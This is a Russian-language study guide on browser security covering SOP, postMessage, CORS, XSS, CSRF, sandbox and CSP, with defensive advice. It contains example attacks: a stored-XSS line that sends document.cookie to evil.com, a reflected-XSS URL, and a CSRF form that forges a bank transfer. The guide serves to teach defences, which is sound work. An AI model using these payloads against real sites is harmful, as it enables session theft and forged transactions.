## 🔎 Навигация по разделам

1. [🔐 Same-Origin Policy (SOP)](#sop)
2. [📬 Метод postMessage](#postmessage)
3. [🔐 CORS (Cross-Origin Resource Sharing)](#cors)
4. [🔥 XSS (Cross-Site Scripting)](#xss)
5. [💣 CSRF (Cross-Site Request Forgery)](#csrf)
6. [🧱 Атрибут sandbox](#sandbox)
7. [🔐 CSP (Content Security Policy)](#csp)
8. [🧩 Сравнение XSS и CSRF](#xss-vs-csrf)

## <a name="sop"></a> 🔐 Same-Origin Policy (SOP)

SOP (Политика одного источника) — это механизм безопасности, который ограничивает, как документы или скрипты,
загруженные из одного источника, могут взаимодействовать с ресурсами из другого источника.

📌 Что считается одним источником?

Источник (origin) состоит из трёх компонентов:

* Scheme (протокол): http / https;
* Host (домен): example.com / api.example.com;
* Port (порт): 80, 443, 3000, и т.д.

➡️ Два URL считаются одного origin, только если ВСЕ три компонента совпадают.

🧱 Что ограничивает SOP?

SOP ограничивает доступ к:

* DOM-структуре других источников (например, iframe).
* Cookies, localStorage, sessionStorage.
* AJAX/fetch запросам к другим origin (если нет CORS).

🗂️ Примеры работы SOP

1. DOM-доступ к iframe

```html

<iframe src="https://other-domain.com"></iframe>
<script>
    const frame = document.querySelector("iframe");
    console.log(frame.contentWindow.document); // ❌ Ошибка из-за SOP
</script>
```

🚨 Почему это важно?

Без SOP любой сайт мог бы:

* Читать вашу почту из mail.google.com
* Получить токен из localStorage другого сайта
* Подделать действия от вашего имени (CSRF)

✅ Как взаимодействовать между источниками:

* CORS (Cross-Origin Resource Sharing) — сервер должен явно разрешить доступ
* postMessage — безопасная передача сообщений между окнами/iframes

---

🎯 Зачем используется document.domain

Чтобы разрешить взаимодействие между страницами из одного “организационного домена”, например:

`
admin.example.com
shop.example.com
`

➡️ Они могут согласованно установить document.domain = "example.com"
и получить доступ к DOM друг друга.

🚫 Почему `document.domain` больше не рекомендуют?

* Это устаревающий механизм, несовместимый с строгим CSP, sandbox в iframe.
* Потенциально расширяет атакующую поверхность.

🔒 Современная альтернатива — postMessage.

---

## <a name="postmessage"></a> 📬 Что такое `postMessage`

Метод `window.postMessage` позволяет одному окну отправить сообщение другому окну, даже если они из разных origin. Это
безопасный способ взаимодействия между:

* Родительским окном и `iframe`
* Двумя разными вкладками
* Окном и попапом (через window.open)

```html
<!-- РОДИТЕЛЬ -->
<iframe src="https://child.com" id="child"></iframe>
<script>
    const iframe = document.getElementById('child');

    // Дожидаемся загрузки iframe:
    iframe.onload = () => {
        // Отправляем сообщение во фрейм:
        iframe.contentWindow.postMessage({type: 'ping'}, 'https://child.com');
        // 🚨 ОБЯЗАТЕЛЬНО указываем origin получателя,
    };


    // Получаем ответ от фрейма:
    window.addEventListener('message', (event) => {
        // 🚨 ОБЯЗАТЕЛЬНО проверяем источник
        if (event.origin !== 'https://child.com') return;

        // 🚨 ОБЯЗАТЕЛЬНО валидация схемы (например, с zod или ajv)
        console.log('Ответ от iframe:', event.data);
    });
</script>

<!-- РЕБЕНОК -->
<script>
    window.addEventListener('message', (event) => {
        // 🚨 ОБЯЗАТЕЛЬНО проверяем источник
        if (event.origin !== 'https://parent.com') return;

        // 🚨 ОБЯЗАТЕЛЬНО валидация схемы (например, с zod или ajv)
        console.log('Сообщение от родителя:', event.data);

        // Отправляем родителю:
        event.source.postMessage({type: 'pong'}, event.origin);
    });
</script>
```

🔎 Где используется `postMessage` в реальных проектах?

* Авторизация через OAuth2 (popup возвращает токен родителю)
* Виджеты с iframe (например, чат, платёжные формы)
* Интеграции между микрофронтендами
* Расширения браузера

---

## <a name="cors"></a> 🔐 Что такое CORS?

CORS (Cross-Origin Resource Sharing) — это механизм, который позволяет серверу явно указать, каким другим источникам (
origin) можно обращаться к его ресурсам через браузер.

👉 Без CORS браузер заблокирует клиентский запрос к ресурсу с другого origin, даже если сервер ответил 200 OK.

📌 Когда возникает "кросс-доменный" запрос?

Когда источник (origin) отправителя и получателя отличаются хотя бы по одному из 3 параметров:

* Scheme (протокол): http / https
* Host (домен): example.com / api.example.com
* Port (порт): 80, 443, 3000, и т.д.

🔹 Ключевой заголовок: Access-Control-Allow-Origin

```
Access-Control-Allow-Origin: https://frontend.com
```

💡 Виды CORS-запросов:

1. Простой (simple request)

* Методы: GET, POST, HEAD
* Заголовки: только Accept, Content-Type (ограниченные значения), User-Agent и др.

👉 Отправляется напрямую, без дополнительного запроса

2. Предварительный (preflight request)

* Метод: PUT, DELETE, PATCH, нестандартные POST
* Заголовки: кастомные (Authorization, X-Token, и т.п.)
* Content-Type: application/json — уже вызывает preflight!
* Браузер сначала делает OPTIONS-запрос (preflight), чтобы спросить у сервера: «а можно?»

Пример запроса:

```
OPTIONS /data HTTP/1.1
Origin: https://frontend.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```

И сервер должен ответить:

```
Access-Control-Allow-Origin: https://frontend.com
Access-Control-Allow-Methods: POST, OPTIONS
Access-Control-Allow-Headers: Authorization
```

Другие важные CORS-заголовки

| Заголовок                          | Описание                                      |
|------------------------------------|-----------------------------------------------|
| `Access-Control-Allow-Origin`      | Разрешённый origin                            |
| `Access-Control-Allow-Methods`     | Разрешённые HTTP-методы                       |
| `Access-Control-Allow-Headers`     | Разрешённые заголовки                         |
| `Access-Control-Allow-Credentials` | Разрешены ли куки (только если origin НЕ `*`) |
| `Access-Control-Expose-Headers`    | Какие заголовки доступны клиенту              |
| `Access-Control-Max-Age`           | Кеширование preflight-запроса                 |

🍪 CORS и куки (credentials)

* На клиенте:

```js
fetch("https://api.example.com/data", {
    credentials: "include"
})
```

* На сервере:

```
Access-Control-Allow-Origin: https://frontend.com
Access-Control-Allow-Credentials: true
```

❗ Нельзя использовать * с Allow-Credentials: true!

---

## <a name="xss"></a> 🔥 Что такое XSS?

XSS (Cross-Site Scripting) — это атака, при которой злоумышленник внедряет вредоносный JavaScript-код в веб-страницу,
который затем выполняется у других пользователей.

Цель XSS — выполнить свой JS в контексте доверенного сайта, чтобы:

* украсть cookies / токены
* подменить DOM
* сделать фишинг
* выполнить действия от лица пользователя

🧨 Виды XSS

1. Reflected XSS (отражённый)

* Скрипт передаётся через URL или форму.
* Отображается на странице сразу (например, в ответе от сервера).

```
https://site.com/search?q=<script>alert(1)</script>
```

2. Stored XSS (сохраняемый)

* Вредоносный скрипт сохраняется на сервере (в базе, комментариях, и т.п.).
* Выполняется у всех, кто открывает заражённую страницу.

```html
<!-- Комментарий от злоумышленника -->
<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>
```

3. DOM-based XSS

* Уязвимость возникает в JS-коде на клиенте
* Нет участия сервера — вся логика в DOM/JS

```js
// 🚨 Опасно: вставляем данные из location.hash без фильтрации
document.getElementById("output").innerHTML = location.hash; // ❌ XSS

// Решение:
document.getElementById("output").textContent = location.hash; // ✅ Безопасно:
```

🔒 Как защититься от XSS

🔹 1. Экранирование HTML

Никогда не вставляй "сырые" данные в innerHTML, если не прошли фильтрацию

🔹 2. Используй безопасные методы вставки

| Опасно                              | Безопасно                    |
|-------------------------------------|------------------------------|
| `innerHTML`                         | `textContent`                |
| `document.write`                    | `createTextNode`             |
| `dangerouslySetInnerHTML` (в React) | JSX (по умолчанию безопасен) |

🔹 3. Content Security Policy (CSP)

Устанавливает правила, откуда можно загружать скрипты

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

🔹 4. Санитизация (очистка) данных

Используй библиотеки: DOMPurify, sanitize-html

```js
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(userInput);
```

💥 Пример DOM-based XSS

```html

<script>
    const hash = location.hash;
    document.getElementById("output").innerHTML = hash; // ❌ XSS
</script>
```

---

## <a name="sandbox"></a> 🧱 Что такое sandbox?

`sandbox` — это атрибут HTML-тега `iframe`, который включает ограничения безопасности для содержимого внутри iframe.

```html

<iframe src="https://untrusted.com" sandbox></iframe>
```

📌 По умолчанию без параметров sandbox запрещает:

* выполнение скриптов
* отправку форм
* открытие новых окон
* доступ к top/parent
* запуск плагинов
* изменение URL
* и др.

Это используется, например, для рекламы, недоверенного контента и тестов.

🧠 Как работает sandbox под капотом

* iframe получает ограниченные права в JavaScript API
* Его контекст становится изолированным (возможно — другой origin)
* Браузер блокирует потенциально опасные действия, даже если они допустимы на обычной странице

📚 Полный список флагов sandbox

| Флаг                             | Что разрешает                                                   |
|----------------------------------|-----------------------------------------------------------------|
| `allow-scripts`                  | Выполнение JS внутри iframe                                     |
| `allow-same-origin`              | Считать iframe тем же origin (иначе он становится "песочницей") |
| `allow-forms`                    | Отправку форм                                                   |
| `allow-popups`                   | Открытие окон (`window.open`)                                   |
| `allow-modals`                   | Открытие модальных окон (`alert`, `confirm`)                    |
| `allow-top-navigation`           | Изменение `top.location`                                        |
| `allow-downloads`                | Загрузку файлов без prompt                                      |
| `allow-presentation`             | Старт презентаций (например, в видео)                           |
| `allow-popups-to-escape-sandbox` | Popup'ам выходить из sandbox (очень ограниченный случай)        |

---

## <a name="csp"></a> 🔐 Что такое CSP?

CSP (Content Security Policy) — это HTTP-заголовок (или meta-тег), который сообщает браузеру:

“Разрешай только такие скрипты, стили, фреймы и т.д., которые соответствуют этим правилам.”

Браузер блокирует всё, что не соответствует политике.

💡 Как внедрить CSP

1. В HTTP-заголовке:

```
Content-Security-Policy: script-src 'self'
```

2. Через <meta> (менее надёжно):

```html

<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

🛡️ Что можно контролировать с помощью CSP

| Директива                  | Что контролирует                                                   |
|----------------------------|--------------------------------------------------------------------|
| `default-src`              | Базовая политика по умолчанию                                      |
| `script-src`               | Источники JS                                                       |
| `style-src`                | Источники CSS                                                      |
| `img-src`                  | Изображения                                                        |
| `font-src`                 | Шрифты                                                             |
| `connect-src`              | AJAX / WebSocket                                                   |
| `frame-src`                | `iframe` и встраивание                                             |
| `media-src`                | аудио / видео                                                      |
| `object-src`               | Flash, плагины (лучше `none`)                                      |
| `form-action`              | Куда можно отправлять формы                                        |
| `frame-ancestors`          | Кто может встраивать этот сайт в `iframe` (защита от clickjacking) |
| `report-uri` / `report-to` | Куда отправлять отчеты о нарушениях                                |

🧱 Пример базовой политики CSP

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://trusted.cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src *;
  object-src 'none';
```

🔍 Разбор:

* `'self'` — только с того же origin
* `script-src` — разрешает только локальные и CDN-скрипты
* `'unsafe-inline'` в style-src разрешает inline-стили (⚠️ нежелательно)
* `img-src *` — можно грузить картинки откуда угодно
* `object-src 'none'` — полностью запрещает плагины (в т.ч. Flash)

⚠️ Опасные исключения

`'unsafe-inline'` — позволяет XSS через inline-скрипты
`'unsafe-eval'` — позволяет использовать eval()

* `*` — любой источник (иногда допустим, например для картинок, но не для скриптов)

---

## <a name="csrf"></a> 🔒 Что такое CSRF?

CSRF (Cross-Site Request Forgery межсайтовая подделка запроса) — это атака, при которой злоумышленник заставляет браузер
жертвы выполнить запрос от
её имени к другому сайту, где она уже авторизована (например, к банку или админке).

➡️ Пользователь авторизован, и браузер автоматически отправляет cookie

➡️ Злоумышленник подделывает форму или запрос

➡️ Жертва переходит на сайт злоумышленника и невольно делает действие от своего имени

📌 Пример атаки

У жертвы есть авторизация на bank.com, и в браузере есть auth_cookie.

Злоумышленник создаёт у себя:

```
<!-- evil.com -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="to" value="attacker">
  <button type="submit">ПОЛУЧИТЬ БОНУС 😇</button>
</form>
```

👆 Когда пользователь нажмёт кнопку — его браузер отправит запрос с его куками, и банк подумает, что это легитимный
перевод.

🧨 Почему это работает?

Потому что:

* Браузер автоматически прикрепляет cookies и сессии
* Сервер не проверяет, откуда пришёл запрос
* Пользователь ничего не подозревает

🧱 Как защититься от CSRF

🔹 1. CSRF-токен

При рендере формы сервер вставляет скрытое поле:

```
<input type="hidden" name="csrf_token" value="abc123">
```

При отправке сервер сравнивает токен с ожидаемым значением (из сессии)

→ Даже если злоумышленник подделает форму, он не сможет угадать токен.

🔹 2. SameSite cookies

Устанавливает политику, когда cookie не должны отправляться с кросс-доменных запросов.

```
Set-Cookie: auth_token=abc123; SameSite=Strict; Secure
```

Значения:

* `Strict` — куки отправляются только при навигации с того же сайта
* `Lax` — куки НЕ отправляются с POST, но можно с GET (например, ссылки)
* `None` — разрешает кросс-доменные запросы, но требует Secure

Для SPA:

```
Set-Cookie: auth_token=abc123; SameSite=Strict; Secure; HttpOnly
```

| Флаг              | Назначение                                                                        |
|-------------------|-----------------------------------------------------------------------------------|
| `SameSite=Strict` | Куки не отправляются на сайт при переходе с другого сайта (полная защита от CSRF) |
| `Secure`          | Только по HTTPS                                                                   |
| `HttpOnly`        | Не доступно через JavaScript (XSS-защита)                                         |

🔹 3. Проверка заголовка Origin или Referer

Сервер проверяет, что запрос пришёл с ожидаемого источника.

```ts
if (req.headers.origin !== "https://yourapp.com") {
  return res.status(403).send("Possible CSRF attack");
}
```

Не всегда работает (например, в GET Referer может отсутствовать), но хорошая дополнительная мера.

🔹 4. Уйти от cookie-based auth → использовать JWT в header

Если твой SPA использует Bearer-токен (в Authorization), CSRF невозможен по определению.

```js
fetch("/api/transfer", {
    method: "POST",
    headers: {
        Authorization: `Bearer ${token}`
    }
});


```

Браузер не добавит токен автоматически → значит CSRF-атака невозможна.

---

## <a name="xss-vs-csrf"></a> 🧩 Краткое сравнение XSS и CSRF

|                       | XSS                        | CSRF                                                |
|-----------------------|----------------------------|-----------------------------------------------------|
| Где выполняется?      | На стороне клиента (DOM)   | На стороне сервера                                  |
| Кто атакует?          | Злоумышленник выполняет JS | Жертва делает запрос                                |
| Что нужно атакующему? | Внедрить JS-код            | Заставить жертву перейти на URL или отправить форму |
| Уязвимость где?       | В клиентском коде          | В серверной логике                                  |
